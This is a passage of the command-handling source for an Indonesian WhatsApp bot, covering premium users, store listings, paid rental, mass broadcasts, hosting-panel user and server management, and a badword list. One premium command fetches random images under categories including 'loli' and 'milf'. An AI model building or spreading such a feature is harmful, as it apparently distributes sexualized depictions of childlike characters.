liaacans.sendMessage(m.sender, {audio:{url:tts}, mimetype:'audio/mpeg', ptt:true}, {quoted:fvn})
}
break
//------------------< Premium >-------------------
case 'addprem':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await liaacans.onWhatsApp(prrkek)
if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./json/premium.json', JSON.stringify(prem))
m.reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
break
case 'delprem':
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./json/premium.json', JSON.stringify(prem))
m.reply(`Nomor ${ya} Telah Di Hapus Premium!`)
break
case 'listpremium': case 'listprem':
teks = '*「 LIST PREMIUM 」*\n\n'
for (let liaacans of prem) {
teks += `- ${liaacans}\n`
}
teks += `\n*Total : ${prem.length}*`
liaacans.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
        // Menu Store
        case 'item':
        if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                    if (!m.isGroup) throw `Perintah Ini Khusus Untuk Grup`
            if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
            if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group ini`)
            var arr_rows = [];
            for (let x of db_respon_list) {
                if (x.id === m.chat) {
                    arr_rows.push({
                        title: x.key,
                        rowId: x.key
                    })
                }
            }
const listMessage = {
  text: `${pushname} 👋\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!\n🕰 Jam : ${moment().format("HH:mm:ss z")} `,
  footer: "© Created By Auliahost-BOT",
  buttonText: "Click Here!",
  sections: [{
                    title: groupName, rows: arr_rows
                }],
                listType: 1
}

await liaacans.sendMessage(m.chat, listMessage)
               break
        
        case 'additem':
        if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            if (!m.isGroup) throw `Perintah Ini Khusus Untuk Grup`
            if (!isAdmins && !isCreator) return m.reply('Only Admins')
            var args1 = text.split("@")[0]
            var args2 = text.split("@")[1]                
            if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} Dm Ml@List`)
            if (isAlreadyResponList(m.chat, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            if (/image/.test(mime)) {
              let media = await liaacans.downloadAndSaveMediaMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
                const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        m.reply(`Sukses set list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                addResponList(m.chat, args1, args2, false, '-', db_respon_list)
                m.reply(`Sukses set list message dengan key : *${args1}*`)
            }
            break
        case 'delitem':
        if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            if (!m.isGroup) throw `Perintah Ini Khusus Group`
            if (!isAdmins && !isCreator) return m.reply('Only Admins')
            if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
            if (!q) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} Dm Ml`)
            if (!isAlreadyResponList(m.chat, q, db_respon_list)) return reply(`List Item dengan Nama *${q}* tidak ada di database!`)
            delResponList(m.chat, q, db_respon_list)
            m.reply(`Sukses delete list message dengan key *${q}*`)
            break
        case 'changeitem': case 'change':
        if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            if (!m.isGroup) throw `Perintah Ini Khusus Grup`
            if (!isAdmins && !isCreator) return m.reply('Only Admins')
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} Dm Ml@List`)
            if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
            if (/image/.test(mime)) {
                let media = await liaacans.downloadAndSaveMediaMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
              const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        m.reply(`Sukses update list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
                m.reply(`Sukses update respon list dengan key *${args1}*`)
            }
            break
case 'proses': // fix by aulia rahman (saia cowo)
            if (!m.isGroup) return m.reply(mess.group)
            if (!isAdmins) throw `Khusus Untuk Admin Grup`
            if (!m.quoted) return m.reply('Reply Bukti Pembayaran!!')
            if (!text) return m.reply('Masukan Catatan Pelanggan\nContoh: proses 11 Diamond Ml | Id 12345678(1234)')
            let numb = m.sender
            let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`✨ STATUS  : Pending\n📅 TANGGAL : ${hariini}\n⏰ JAM : ${jam}\`\`\`\n\n📝 Catatan :\n${text}\n\nPesanan @${numb.split("@")[0]} sedang di proses!`
            liaacans.sendMessage(m.chat, {text: proses}, {quoted:floc}, {mentions: numb})
            break
        case 'done': // fix by aulia rahman (saia cowo)
            if (!isAdmins) return m.reply(`Khusus Untuk Admin Grup`)
            if (!m.isGroup) throw mess.group
            if (!m.quoted) return m.reply('Reply Sesudah Done!!')
            if (!text) return m.reply('Masukan Catatan Transaksi')
            let numbb = m.sender             
            let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`✨ STATUS  : Berhasil\n📅 TANGGAL : ${hariini}\n⏰ JAM : ${jam}\`\`\`\n\n📝 Catatan :\n${text}\n\nTerima Kasih @${numbb.split("@")[0]} Next Order Ya👷`
            liaacans.sendMessage(m.chat, {text: sukses}, {quoted:floc}, {mentions: numbb})
            break
case 'ssweb-pc':
case 'ssweb-hp':{
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!q) return m.reply(`Masukan parameter url\n*Contoh:*\n${prefix+command} https://google.com`)
m.reply(mess.wait)
let anu =`https://shot.screenshotapi.net/screenshot?&url=${q}`
liaacans.sendMessage(m.chat, { image: {url: anu}, caption: 'Done!'}, {quoted:m})
}
break
case 'sewabot': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
sewabot = `⌜  LIST SEWA Auliahost-BOT ⌟

HARGA :
RP 5.000 → 20 DAY
RP 10.000 → 30 DAY
RP 25.000 → PERMANEN

APA ITU DAY? DAY ITU ADALAH HARI!

⌜ KEUNTUNGAN SEWA AULIAHOST-BOT ⌟

→ BISA ADD BOT 1 GROUP
→ BISA GUNAIN FITUR ADMIN
→ BISA MENJAGA GROUP, JIKA ADMIN GROUP SIBUK

MINAT SEWA BOT?
HUBUNGI OWNER BOT!
KETIK .owner`
let buttons = [{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
liaacans.sendButtonText(m.chat, buttons, sewabot, creator)
}
break
case 'readmore': case 'more':
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
 if (!q.includes('|')) return  m.reply("Penggunaan teks| teks")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
m.reply( text1 + readmore + text2)
break
case 'sound1':case 'sound2':
case 'sound3':case 'sound4':case 'sound5':case 'sound6':
case 'sound7':case 'sound8':case 'sound9':case 'sound10':
case 'sound11':case 'sound12':case 'sound13':case 'sound14':
case 'sound15':case 'sound16':case 'sound17':case 'sound18':
case 'sound19':case 'sound20':case 'sound21':case 'sound22':
case 'sound23':case 'sound24':case 'sound25':case 'sound26':
case 'sound27':case 'sound28':case 'sound29':case 'sound30':
case 'sound31':case 'sound32':case 'sound33':case 'sound34':
case 'sound35':case 'sound36':case 'sound37':case 'sound38':
case 'sound39':case 'sound40':case 'sound41':case 'sound42':
case 'sound43':case 'sound44':case 'sound45':case 'sound46':
case 'sound47':case 'sound48':case 'sound49':case 'sound50':
case 'sound51':case 'sound52':case 'sound53':case 'sound54':
case 'sound55':case 'sound56':case 'sound57':case 'sound58':
case 'sound59':case 'sound60':case 'sound61':case 'sound62':
case 'sound63':case 'sound64':case 'sound65':case 'sound66':
case 'sound67':case 'sound68':case 'sound69':case 'sound70':
case 'sound71':case 'sound72':case 'sound73':case 'sound74':
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!isPremium) throw mess.prem
m.reply(mess.wait)
var inicdd = await getBuffer(`https://github.com/saipulanuar/Api-Github/raw/main/sound/${command}.mp3`)
liaacans.sendMessage(m.chat, {audio:inicdd, mimetype:'audio/mpeg', ptt:true}, {quoted: fvn})
break
//Random Wibu
case 'waifu':
case 'loli':
case 'husbu':
case 'milf':
case 'cosplay':
case 'wallml':{
if (!isPremium) throw mess.prem
m.reply(mess.wait)
let eek = await fetchJson(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)
let random = eek[Math.floor(Math.random() * eek.length)]
liaacans.sendMessage(m.chat, { image: { url: random }, caption: `Nih Kak` }, { quoted: kafloc })
}
break
// BROADCAST
case 'bc': case 'broadcast': case 'bcall': {
if (!isCreator) throw mess.owner
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let chitt = await store.chats.all()
m.reply(`Sukses Mengirim Broadcast`)
		for (let yoi of chitt) {
		await sleep(1500)
		let txt = `「 Broadcast Bot 」\n\n${text}`
		let buttons = [{ buttonId: 'sewabot', buttonText: { displayText: 'SEWA BOT' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 }]
            await liaacans.sendButtonText(yoi, buttons, txt, creator, m, {quoted: fkontak})
		}
		m.reply('Sukses Broadcast')
}
break
case 'bcgc': case 'bcgroup': {
if (!isCreator) throw mess.owner
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await liaacans.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Sukses Mengirim Group Broadcast`)
for (let i of anu) {
await sleep(1500)
let txt = `「 Broadcast Bot 」\n\n${text}`
let buttons = [{ buttonId: 'donasi', buttonText: { displayText: 'DONASI' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 }]
await liaacans.sendButtonText(i, buttons, txt, creator, m, {quoted: fkontak})
}
m.reply(`Sukses Mengirim Broadcast Ke Group`)
}
break
case 'afk': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} *Telah Afk*${text ? ': ' + text : ''}`)
            }
            break
case 'myip': {
                if (!isCreator) throw mess.owner
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        m.reply("🔎 My public IP address is: " + ip);
                    })
                })
            }
            break
case 'tagme': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            if (!m.isGroup) throw mess.group
            let me = m.sender
            let jawab = `*@${me.split('@')[0]}*`
            let ments = [me]
            let buttons = [{ buttonId: 'rules', buttonText: { displayText: '❗RULES' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, jawab, creator, m, {mentions: ments, quoted: fkontak})
            }
            break
case 'tinyurl': { // by rahman (gw)
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            	if (!text) throw 'Masukkan Query Link!'
                let anu = await fetchJson(`https://tinyurl.com/api-create.php?url=${text}`)
                liaacans.sendMessage(m.chat,{ text: anu.data + `\nNih Bro`}, { quoted: fdoc })
            }
            break
case 'shortlink': { // by rahman (gw)
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            	if (!text) throw 'Masukkan Query Link!'
                let anu = await fetchJson(`https://shortlink-url.xyz/api-create.php?url=${text}`)
                liaacans.sendMessage(m.chat,{ text: anu.data + `\nNih Bro`}, { quoted: fdoc })
            }
            break
case 'closetime':
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return m.reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
m.reply(`Close time ${q} dimulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
liaacans.groupSettingUpdate(m.chat, 'announcement')
m.reply(close)
}, timer)
break
case 'opentime':
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return m.reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
m.reply(`Open time ${q} dimulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
liaacans.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(open)
}, timer)
break
case 'listusr': {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let users = res.data
let sections = []
for (let user of users) {
let u = user.attributes
let obj = {
title: "LIST USERR RAHMXBOT",
rows: [
{ title: `${u.id}. ${u.username}`, rowId: `${prefix}detusr ` + u.id, description: u.first_name + ' ' + u.last_name },
]
}
await sections.push(obj)
if (sections.length === 50) {
sections.push({
title: "List Userr RahmXBot",
rows: [
{ title: `⏩ NEXT`, rowId: `${prefix}listusr 2`, description: 'Page 2' },
{ title: `⏩ NEXT`, rowId: `${prefix}listusr 3`, description: 'Page 3' },
{ title: `⏩ NEXT`, rowId: `${prefix}listusr 4`, description: 'Page 4' },
{ title: `⏩ NEXT`, rowId: `${prefix}listusr 5`, description: 'Page 5' },
]
})
}
}
await liaacans.sendMessage(m.chat, {
text: "Berikut list user *RahmXBot*",
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`,
title: "*List User RahmXBot*",
buttonText: `${res.meta.pagination.count} Users`,
sections
},{ quoted : m })
}
break
case 'addusr': {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await liaacans.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await liaacans.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}

*Password telah dikirim di private chat @${u.split`@`[0]}*`, mentions:[u],
})
liaacans.sendMessage(u, { text: `*===[ AKUN PANEL ANDA ]===*\n
📡ID: ${user.id}
📬EMAIL: ${user.uuid}
👤USERNAME: ${user.username}
🔐PASSWORD: ${password.toString()}
🖥️LOGIN: ${domain}
📊TOTURIAL : youtu.be/3s9CLUWjIMI\n
=====================================
        *☢️WARNING☢️*
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================`,
})
}
break
case 'delusr': {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE USER*')
}
break
case 'detusr': {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json()
if (res.errors) return m.reply('*USER NOT FOUND*')
let u = res.attributes
m.reply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case 'listsrv': {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let page = args[0] ? args[0] : '1'
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data
let sections = []
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let obj = {
title: "List Server RahmXBot",
rows: [
{ title: `${s.id}. ${s.name}`, rowId: `${prefix}detsrv ` + s.id, description: `Status: ${data.attributes ? data.attributes.current_state : s.status}` },
]
}
await sections.push(obj)
if (sections.length >= 50 && res.meta.pagination.links.next) {
sections.push({
title: "Pilih List Server RahmXBot",
rows: [
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 2`, description: 'Page 2' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 3`, description: 'Page 3' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 4`, description: 'Page 4' },
{ title: `⏩ NEXT`, rowId: `${prefix}listsrv 5`, description: 'Page 5' },
]
})
}
}
await liaacans.sendMessage(m.chat, {
text: "Berikut list server *RahmXBot*",
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`,
title: "List Server RahmXBot",
buttonText: `${res.meta.pagination.count} Servers`,
sections
}, { quoted: m })
}
break
case 'addsrv': {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let s = text.split(',');
if (s.length < 7) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case 'delsrv': {

if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let srv = args[0]
if (!srv) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('*SERVER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case 'detsrv': {

let srv = args[0]
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
if (res.errors) return m.reply('*SERVER NOT FOUND*')
let s = res.attributes
let f2 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f2.json();
let t = data.attributes
m.reply(`*${s.name.toUpperCase()} SERVER DETAILS*

STATUS: ${t.current_state}

ID: ${s.id}
UUID: ${s.uuid}
NAME: ${s.name}
DESCRIPTION: ${s.description}
MEMORY: ${await (format(t.resources.memory_bytes)).toString()} / ${s.limits.memory === 0 ? 'Unlimited' : s.limits.memory + 'MB'}
DISK: ${await (format(t.resources.disk_bytes)).toString()} / ${s.limits.disk === 0 ? 'Unlimited' : s.limits.disk + 'MB'}
CPU: ${t.resources.cpu_absolute}% / ${s.limits.cpu === 0 ? 'Unlimited' : s.limits.cpu + '%'}
CREATED AT: ${s.created_at}`)
}
break
case 'listbadword':
                let bi = `List badword\n\n`
                for (let boo of badword){
                    bi += `- ${boo}\n`
                }
                bi += `\nTotal : ${badword.length}`
                m.reply(bi)
                break
            case 'addbadword':
                if (!isCreator) throw mess.owner
                if (!text) return m.reply(`masukkan kata`)
                if (isKasar(args[1].toLowerCase(), badword)) return m.reply(`Udah ada`)
                addBadword(args[1].toLowerCase(), badword)
                m.reply(`Sukses`)
                break
            case 'delbadword':
                if (!isCreator) throw mess.owner
                if (args.length < 2) return m.reply(`masukkan kata`)
                if (!isKasar(args[1].toLowerCase(), badword)) return m.reply(`Ga ada`)
                delBadword(args[1].toLowerCase(), badword)
                m.reply(`Sukses`)
                break
            case 'clearbadword':
                if (!isCreator) throw mess.owner
                if (args.length < 2) return m.reply(`tag atau nomor`)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                    delCountKasar(mentioned[i], senbadword)
                    }
                    m.reply('Sukses')
                } else {
                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
                    m.reply('Sukses')
                }
                break
case 'creategc': { // fix aja msih gabisa🗿
if (!isCreator) throw mess.owner
if (!args.join(" ")) return m.reply(`Masukan Nama Group Nya\nContoh ${prefix + command} Group Gajelas🗿`)
try {
let cret = await liaacans.groupCreate(args.join(" "), [])
let response = await liaacans.groupInviteCode(m.chat)
teks = `     「 Group Create Fitur 」
▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
https://chat.whatsapp.com/${response}
       `
liaacans.sendMessage(m.chat, { text:teks, mentions: await liaacans.parseMention(teks)}, {quoted:ftroli})
} catch {
m.reply("Error!")
}
}
break
case 'mediafire': {
if (!text) throw 'Masukkan Query Link!'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return m.reply(`The link you provided is invalid`)
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*MEDIAFIRE DOWNLOADER*
				
*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
